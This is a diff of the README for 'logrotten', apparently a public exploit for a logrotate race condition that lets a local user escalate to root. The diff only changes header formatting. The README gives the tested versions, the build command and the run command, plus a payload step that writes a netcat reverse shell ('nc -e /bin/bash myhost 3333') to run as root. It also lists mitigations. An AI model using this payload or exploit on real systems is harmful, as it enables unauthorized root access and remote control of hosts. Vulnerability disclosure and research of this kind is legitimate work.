@@ -1,6 +1,6 @@
 # logrotten - a logrotate exploit
 
-## [ Brief description ]
+## Brief description
   - logrotate has a race condition vulnerability when it's exectued with
     "create"-option.
   - If logrotate is executed as root, with the "create"-option and the user
@@ -17,31 +17,31 @@
   - A detailed description and a PoC of this challenge was written by the 
   - nsogroup ( https://blog.nsogroup.com/logrotate-zajebiste-500-points/ )
 
-## [ Tested version ]
+## Tested version
   - Debian GNU/Linux 9.5 (stretch)
   - logrotate 3.15.0
 
-## [ Compile ]
+## Compile
   - gcc -o logrotten logrotten.c
 
-## [ Prepare payload ]
+## Prepare payload
 ```
 echo "if [ `id -u` -eq 0 ]; /bin/nc -e /bin/bash myhost 3333 &; fi" > payloadfile
 ```
 
-## [ Run exploit ]
+## Run exploit
 ```
 ./logrotten /tmp/log/pwnme.log payloadfile
 ```
 
-## [ Mitigation ]
+## Mitigation
   - make sure that logpath is owned by root
   - or use option "nocreate"
 
-## [ Author ]
+## Author
   - Wolfgang Hotwagner
 
-## [ Contact ]
-  - [[ https://tech.feedyourhead.at ]]
+## Contact
+  - https://tech.feedyourhead.at
 
 
